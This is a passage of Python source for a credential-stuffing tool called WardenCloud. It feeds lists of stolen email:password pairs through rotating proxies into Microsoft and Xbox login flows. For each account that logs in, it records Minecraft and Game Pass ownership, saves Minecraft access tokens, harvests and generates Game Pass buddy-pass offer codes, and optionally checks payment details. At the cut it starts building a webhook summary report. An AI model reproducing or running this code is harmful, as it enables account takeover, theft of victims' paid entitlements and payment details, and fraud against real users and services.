                payment += f"\n{subscription3}"
                paymentprint += f" | {subscription3}"
            payment += "\n============================\n"
            if screen == "'2'": print(Fore.LIGHTBLUE_EX+f"Payment: {email}:{password}"+paymentprint)
            with open(f"results/{fname}/Payment.txt", 'a', encoding='utf-8') as file: file.write(f"{email}:{password}"+payment)
            break
        except Exception as e:
            #print(e)
            #traceback.print_exc()
            #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
            #print("Exception occurred at line:", line_number)
            retries+=1
            session.proxy = getproxy()

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'})
            if r.status_code == 200:
                try:
                    capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                    CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, session)
                    CAPTURE.handle(session)
                    break
                except: pass
            elif r.status_code == 429:
                retries+=1
                session.proxy = getproxy()
                if len(proxylist) < 5: time.sleep(20)
                continue
            else: break
        except:
            retries+=1
            session.proxy = getproxy()
            continue

def checkownership(entitlements_response):
    items = entitlements_response.get("items", [])
    has_normal_minecraft = False
    has_game_pass_pc = False
    has_game_pass_ultimate = False
    for item in items:
        name = item.get("name", "")
        source = item.get("source", "")
        if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
            has_normal_minecraft = True
        if name == "product_game_pass_pc":
            has_game_pass_pc = True
        if name == "product_game_pass_ultimate":
            has_game_pass_ultimate = True
    if has_normal_minecraft and has_game_pass_pc:
        return "Normal Minecraft (with Game Pass)"
    if has_normal_minecraft and has_game_pass_ultimate:
        return "Normal Minecraft (with Game Pass Ultimate)"
    elif has_normal_minecraft:
        return "Normal Minecraft"
    elif has_game_pass_ultimate:
        return "Xbox Game Pass Ultimate"
    elif has_game_pass_pc:
        return "Xbox Game Pass (PC)"

def checkmc(session, email, password, token, xbox_token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other
    acctype = None
    while True:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/license', headers={'Authorization': f'Bearer {token}'}, verify=False)
            if checkrq.status_code == 429:
                retries+=1
                session.proxy = getproxy()
                if len(proxylist) == 0: time.sleep(20)
                continue
            else: break
        except:
            retries+=1
            session.proxy = getproxy()
            if len(proxylist) == 0: time.sleep(20)
            continue
    if checkrq.status_code == 200:
        acctype = checkownership(checkrq.json())
        if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"{acctype}: {email}:{password}")
        if acctype == "Xbox Game Pass Ultimate" or acctype == "Normal Minecraft (with Game Pass Ultimate)":
            xgpu+=1
            cpm+=1
            checked+=1
            codes = []
            with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
            if "Normal" in acctype:
                with open(f"results/{fname}/Normal.txt", 'a') as f: f.write(f"{email}:{password}\n")
            try:
                while True:
                    try:
                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                        break
                    except:
                        retries+=1
                        session.proxy = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                js = xsts.json()
                uhss = js['DisplayClaims']['xui'][0]['uhs']
                xsts_token = js.get('Token')
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                    "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
                    "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
                    "Origin": "https://www.xbox.com",
                    "Priority": "u=1, i",
                    "Referer": "https://www.xbox.com/",
                    "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
                    "X-Ms-Api-Version": "1.0"
                }
                while True:
                    try:
                        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
                        break
                    except:
                        retries+=1
                        session.proxy = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                if 'offerid' in r.text.lower():
                        offers = r.json()["offers"]
                        current_time = datetime.now(timezone.utc)
                        valid_offer_ids = [offer["offerId"] for offer in offers 
                        if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                        with open(f"results/{fname}/Codes.txt", 'a') as f:
                            for offer in valid_offer_ids:
                                f.write(f"{offer}\n")
                        for offer in offers: codes.append(offer['offerId'])
                        if len(offers) < 5:
                            while True:
                                try:
                                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                    if 'offerId' in r.text:
                                        offers = r.json()["offers"]
                                        current_time = datetime.now(timezone.utc)
                                        valid_offer_ids = [offer["offerId"] for offer in offers 
                                        if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                        with open(f"results/{fname}/Codes.txt", 'a') as f:
                                            for offer in valid_offer_ids:
                                                f.write(f"{offer}\n")
                                        shouldContinue = False
                                        for offer in offers:
                                            if offer['offerId'] not in codes: shouldContinue = True
                                        for offer in offers: codes.append(offer['offerId'])
                                        if shouldContinue == False: break
                                    else: break
                                except:
                                    retries+=1
                                    session.proxy = getproxy()
                                    if len(proxylist) == 0: time.sleep(20)
                                    continue
                else:
                    while True:
                        try:
                            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                            if 'offerId' in r.text:
                                offers = r.json()["offers"]
                                current_time = datetime.now(timezone.utc)
                                valid_offer_ids = [offer["offerId"] for offer in offers 
                                if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                with open(f"results/{fname}/Codes.txt", 'a') as f:
                                    for offer in valid_offer_ids:
                                        f.write(f"{offer}\n")
                                shouldContinue = False
                                for offer in offers:
                                    if offer['offerId'] not in codes: shouldContinue = True
                                for offer in offers: codes.append(offer['offerId'])
                                if shouldContinue == False: break
                            else: break
                        except:
                            retries+=1
                            session.proxy = getproxy()
                            if len(proxylist) == 0: time.sleep(20)
                            continue
            except: pass
            capture_mc(token, session, email, password, acctype)
            return True
        elif acctype == "Xbox Game Pass (PC)" or acctype == "Normal Minecraft (with Game Pass)":
            xgp+=1
            cpm+=1
            checked+=1
            codes = []
            with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
            if "Normal" in acctype:
                with open(f"results/{fname}/Normal.txt", 'a') as f: f.write(f"{email}:{password}\n")
            try:
                while True:
                    try:
                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                        break
                    except:
                        retries+=1
                        session.proxy = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                js = xsts.json()
                uhss = js['DisplayClaims']['xui'][0]['uhs']
                xsts_token = js.get('Token')
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                    "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
                    "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
                    "Origin": "https://www.xbox.com",
                    "Priority": "u=1, i",
                    "Referer": "https://www.xbox.com/",
                    "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
                    "X-Ms-Api-Version": "1.0"
                }
                while True:
                    try:
                        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
                        break
                    except:
                        retries+=1
                        session.proxy = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                if 'offerid' in r.text.lower():
                        offers = r.json()["offers"]
                        current_time = datetime.now(timezone.utc)
                        valid_offer_ids = [offer["offerId"] for offer in offers 
                        if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                        with open(f"results/{fname}/Codes.txt", 'a') as f:
                            for offer in valid_offer_ids:
                                f.write(f"{offer}\n")
                        for offer in offers: codes.append(offer['offerId'])
                        if len(offers) < 5:
                            while True:
                                try:
                                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                    if 'offerId' in r.text:
                                        offers = r.json()["offers"]
                                        current_time = datetime.now(timezone.utc)
                                        valid_offer_ids = [offer["offerId"] for offer in offers 
                                        if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                        with open(f"results/{fname}/Codes.txt", 'a') as f:
                                            for offer in valid_offer_ids:
                                                f.write(f"{offer}\n")
                                        shouldContinue = False
                                        for offer in offers:
                                            if offer['offerId'] not in codes: shouldContinue = True
                                        for offer in offers: codes.append(offer['offerId'])
                                        if shouldContinue == False: break
                                    else: break
                                except:
                                    retries+=1
                                    session.proxy = getproxy()
                                    if len(proxylist) == 0: time.sleep(20)
                                    continue
                else:
                    while True:
                        try:
                            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                            if 'offerId' in r.text:
                                offers = r.json()["offers"]
                                current_time = datetime.now(timezone.utc)
                                valid_offer_ids = [offer["offerId"] for offer in offers 
                                if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                with open(f"results/{fname}/Codes.txt", 'a') as f:
                                    for offer in valid_offer_ids:
                                        f.write(f"{offer}\n")
                                shouldContinue = False
                                for offer in offers:
                                    if offer['offerId'] not in codes: shouldContinue = True
                                for offer in offers: codes.append(offer['offerId'])
                                if shouldContinue == False: break
                            else: break
                        except:
                            retries+=1
                            session.proxy = getproxy()
                            if len(proxylist) == 0: time.sleep(20)
                            continue
            except: pass
            capture_mc(token, session, email, password, acctype)
            return True
        elif acctype == "Normal Minecraft":
            checked+=1
            cpm+=1
            with open(f"results/{fname}/Normal.txt", 'a') as f: f.write(f"{email}:{password}\n")
            capture_mc(token, session, email, password, acctype)
            return True
        else:
            others = []
            if 'product_minecraft_bedrock' in checkrq.text:
                others.append("Minecraft Bedrock")
            if 'product_legends' in checkrq.text:
                others.append("Minecraft Legends")
            if 'product_dungeons' in checkrq.text:
                others.append('Minecraft Dungeons')
            if others != []:
                other+=1
                cpm+=1
                checked+=1
                items = ', '.join(others)
                open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                return True
            else:
                return False
    else:
        return False

def mc_token(session, uhs, xsts_token):
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxy = getproxy()
                if len(proxylist) == 0: time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxy = getproxy()
            continue

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token, xbox_token)
            except: pass
            if hit == False: validmail(email, password)
            if config.get('payment') is True: payment(session, email, password)
    except:
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    finally:
        session.close()

def Load():
    global Combos, fname

    path = input("► ENTER COMBO FILE PATH: ").strip()
    if not os.path.isfile(path):
        print("Invalid file path.")
        time.sleep(2)
        Load()
        return

    fname = os.path.splitext(os.path.basename(path))[0]

    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            Combos = list(set(lines))
            print(f"[{len(lines) - len(Combos)}] Dupes Removed.")
            print(f"[{len(Combos)}] Combos Loaded.")
    except:
        print("Failed to read combo file.")
        time.sleep(2)
        Load()


def Proxys():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.CYAN + Style.BRIGHT + f"Loaded [{len(proxylist)}] lines." + Style.RESET_ALL)
            time.sleep(2)
        except Exception:
            print(Fore.RED + Style.BRIGHT + "Your file is probably harmed." + Style.RESET_ALL)
            time.sleep(2)
            Proxys()

def logscreen():
    """Detailed Log Screen from backup version"""
    global cpm, cpm1, start_time
    
    # 100% Accurate CPM calculation with real-time precision
    current_time = time.time()
    
    # Initialize tracking variables if first run
    if not hasattr(logscreen, 'start_time'):
        logscreen.start_time = start_time
        logscreen.start_checked = 0
        logscreen.last_update = current_time
        logscreen.last_checked = checked
        logscreen.cpm_samples = []
    
    # Calculate overall CPM (most accurate for long runs)
    total_elapsed = current_time - logscreen.start_time
    total_checks = checked - logscreen.start_checked
    overall_cpm = (total_checks / (total_elapsed / 60)) if total_elapsed > 0 else 0
    
    # Calculate recent CPM (for responsiveness)
    time_diff = current_time - logscreen.last_update
    if time_diff >= 0.5:  # Update every 0.5 seconds for better accuracy
        checks_diff = checked - logscreen.last_checked
        recent_cpm = (checks_diff / (time_diff / 60)) if time_diff > 0 else 0
        
        # Store recent samples for smoothing
        logscreen.cpm_samples.append(recent_cpm)
        if len(logscreen.cpm_samples) > 20:  # Keep last 20 samples (10 seconds)
            logscreen.cpm_samples.pop(0)
        
        # Use weighted average: 70% overall CPM + 30% recent average
        recent_avg = sum(logscreen.cpm_samples) / len(logscreen.cpm_samples) if logscreen.cpm_samples else 0
        cpm1 = (overall_cpm * 0.7) + (recent_avg * 0.3) if total_elapsed > 10 else recent_avg
        
        logscreen.last_update = current_time
        logscreen.last_checked = checked
    else:
        cpm1 = getattr(logscreen, 'last_cpm', overall_cpm)
    
    logscreen.last_cpm = cpm1
    
    # Calculate statistics with maximum precision
    progress = (checked / len(Combos) * 100.0) if len(Combos) > 0 else 0.0
    success_rate = (hits / checked * 100.0) if checked > 0 else 0.0
    
    # Enhanced ETA calculation
    elapsed_time = current_time - start_time if 'start_time' in globals() else 0
    remaining = len(Combos) - checked
    
    if cpm1 > 0 and remaining > 0:
        eta_seconds = (remaining / cpm1) * 60
        eta_hours = int(eta_seconds // 3600)
        eta_minutes = int((eta_seconds % 3600) // 60)
        eta_secs = int(eta_seconds % 60)
        eta_display = f"{eta_hours:02d}:{eta_minutes:02d}:{eta_secs:02d}" if eta_hours > 0 else f"{eta_minutes:02d}:{eta_secs:02d}"
    else:
        eta_display = "Calculating..."
    
    # Format elapsed time
    elapsed_hours = int(elapsed_time // 3600)
    elapsed_minutes = int((elapsed_time % 3600) // 60)
    elapsed_secs = int(elapsed_time % 60)
    elapsed_display = f"{elapsed_hours:02d}:{elapsed_minutes:02d}:{elapsed_secs:02d}" if elapsed_hours > 0 else f"{elapsed_minutes:02d}:{elapsed_secs:02d}"
    
    # Create progress bar
    bar_length = 50
    filled_length = int(bar_length * progress / 100)
    bar = '█' * filled_length + '░' * (bar_length - filled_length)
    
    # Clear screen and display modern UI
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Header
    print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.GREEN}{Style.BRIGHT}                        CHECKING IN PROGRESS                                   {Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()
    
    # Progress Section
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Progress{Fore.CYAN} ─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}{bar} {Fore.WHITE}{progress:6.2f}% {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}Checked: {Fore.WHITE}{checked:>6}/{len(Combos):<6} {Fore.CYAN}│ {Fore.GREEN}CPM: {Fore.WHITE}{cpm1:6.1f} {Fore.CYAN}│ {Fore.MAGENTA}ETA: {Fore.WHITE}{eta_display:>8} {Fore.CYAN}│ {Fore.BLUE}Elapsed: {Fore.WHITE}{elapsed_display:>8} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    # Results Section
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Live Results{Fore.CYAN} ─────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}HITS: {Fore.WHITE}{hits:>6} {Fore.CYAN}│ {Fore.RED}BAD: {Fore.WHITE}{bad:>6} {Fore.CYAN}│ {Fore.YELLOW}SUCCESS: {Fore.WHITE}{success_rate:>5.1f}% {Fore.CYAN}│ {Fore.MAGENTA}2FA: {Fore.WHITE}{twofa:>6} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}SFA: {Fore.WHITE}{sfa:>7} {Fore.CYAN}│ {Fore.CYAN}MFA: {Fore.WHITE}{mfa:>6} {Fore.CYAN}│ {Fore.LIGHTMAGENTA_EX}MAIL: {Fore.WHITE}{vm:>7} {Fore.CYAN}│ {Fore.LIGHTYELLOW_EX}OTHER: {Fore.WHITE}{other:>5} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    # Gaming & Services Section
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Gaming & Services{Fore.CYAN} ────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.BLUE}XGP: {Fore.WHITE}{xgp:>7} {Fore.CYAN}│ {Fore.LIGHTBLUE_EX}XGPU: {Fore.WHITE}{xgpu:>5} {Fore.CYAN}│ {Fore.GREEN}DONUT CLEAN: {Fore.WHITE}{donut_unbanned:>5} {Fore.CYAN}│ {Fore.RED}DONUT BANNED: {Fore.WHITE}{donut_banned:>5} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    # System Stats Section
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}System Performance{Fore.CYAN} ───────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}RETRIES: {Fore.WHITE}{retries:>5} {Fore.CYAN}│ {Fore.RED}ERRORS: {Fore.WHITE}{errors:>5} {Fore.CYAN}│ {Fore.GREEN}THREADS: {Fore.WHITE}{thread:>5} {Fore.CYAN}│ {Fore.MAGENTA}PROXIES: {Fore.WHITE}{len(proxylist):>5} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    # Status indicator
    if cpm1 > 0:
        if cpm1 > 100:
            status_color = Fore.GREEN
            status_text = "EXCELLENT PERFORMANCE"
        elif cpm1 > 50:
            status_color = Fore.YELLOW
            status_text = "GOOD PERFORMANCE"
        else:
            status_color = Fore.RED
            status_text = "SLOW PERFORMANCE"
        print(f"{status_color}● {Fore.WHITE}{status_text} - {remaining} accounts remaining{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}● {Fore.WHITE}INITIALIZING CHECKER...{Style.RESET_ALL}")
    
    # Update window title
    utils.set_title(f"WardenCloud | {checked}/{len(Combos)} ({progress:.1f}%) | Hits: {hits} | CPM: {cpm1:.1f} | ETA: {eta_display}")
    
    time.sleep(0.5)
    # Only continue if checking is not complete
    if checked < len(Combos):
        threading.Thread(target=logscreen).start()
    

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.WHITE}{Style.BRIGHT}                            WARDENCLOUD CHECKER                                   {Fore.WHITE}║")
    print(f"╠══════════════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.WHITE}Checked: {Fore.CYAN}{checked:>6}{Fore.WHITE}/{Fore.CYAN}{len(Combos):<6} | {Fore.YELLOW}CPM: {cmp1*60} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.GREEN}HITS:        {Fore.WHITE}{hits:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.RED}BAD:         {Fore.WHITE}{bad:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.YELLOW}SFA:         {Fore.WHITE}{sfa:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.CYAN}MFA:         {Fore.WHITE}{mfa:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.MAGENTA}2FA:         {Fore.WHITE}{twofa:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.LIGHTRED_EX}ERR:         {Fore.WHITE}{errors:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.BLUE}XGP:         {Fore.WHITE}{xgp:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.LIGHTBLUE_EX}XGPU:        {Fore.WHITE}{xgpu:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.LIGHTYELLOW_EX}OTHER:       {Fore.WHITE}{other:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.LIGHTMAGENTA_EX}MAIL:        {Fore.WHITE}{vm:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.YELLOW}RETRY:       {Fore.WHITE}{retries:>6}                                                           {Fore.CYAN}║{Style.RESET_ALL}")
                                                            
    
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    # Update window title with comprehensive stats
    utils.set_title(f"Wardencloud | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  MFA: {mfa}")    
    time.sleep(0.5)  # Faster updates for better responsiveness
    # Only continue if checking is not complete
    if checked < len(Combos):
        threading.Thread(target=cuiscreen).start()

def finishedscreen():
    """End Screen from backup version"""
    global hits, bad, sfa, mfa, twofa, xgp, xgpu, other, vm, retries, errors, fname, donut_banned, donut_unbanned, checked
    os.system('cls')
    print(logo)
    print()
    print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.GREEN}{Style.BRIGHT}                        CHECKING COMPLETE!                                  {Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()
    
    # Calculate success rate
    success_rate = (hits / checked * 100) if checked > 0 else 0
    
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Results Summary{Fore.CYAN} ──────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│                                                                              │{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}> HITS: {Fore.WHITE}{hits:<8} {Fore.CYAN}│ {Fore.RED}> BAD: {Fore.WHITE}{bad:<8} {Fore.CYAN}│ {Fore.YELLOW}> SUCCESS: {Fore.WHITE}{success_rate:.1f}%{' '*(6-len(f'{success_rate:.1f}'))} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.MAGENTA}> 2FA :{Fore.WHITE} {twofa:<12} {Fore.CYAN}│ {Fore.YELLOW}> SFA:{Fore.WHITE} {sfa:<8} {Fore.CYAN}│ {Fore.CYAN}> MFA:{Fore.WHITE} {mfa:<16} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.BLUE}> XGP:{Fore.WHITE} {xgp:<12} {Fore.CYAN}│ {Fore.LIGHTBLUE_EX}> XGPU:{Fore.WHITE} {xgpu:<7} {Fore.CYAN}│ {Fore.LIGHTMAGENTA_EX}> Mail:{Fore.WHITE} {vm:<14} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}> Donut Unbanned:{Fore.WHITE} {donut_unbanned:<8} {Fore.CYAN}│ {Fore.RED}> Donut Banned:{Fore.WHITE} {donut_banned:<18} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│                                                                              │{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Performance Stats{Fore.CYAN} ────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}> Checked:{Fore.WHITE} {checked}/{len(Combos):<8} {Fore.CYAN}│ {Fore.YELLOW}> Retries:{Fore.WHITE} {retries:<8} {Fore.CYAN}│ {Fore.YELLOW}> Errors:{Fore.WHITE} {errors:<11} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}> CPM:{Fore.WHITE} {cpm1:<12.1f} {Fore.CYAN}│ {Fore.CYAN}> Threads:{Fore.WHITE} {thread:<7} {Fore.CYAN}│ {Fore.MAGENTA}> Proxies:{Fore.WHITE} {len(proxylist):<10} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()

    print()

    print(f"{Fore.YELLOW}Press any key to exit...{Style.RESET_ALL}")
    try:
        import msvcrt
        msvcrt.getch()
    except:
        input()

    webhook_url = config.get('webhooklogs')  # Use the existing webhook from config
    summary_payload = {
        "username": "WardenCloud Restocker",
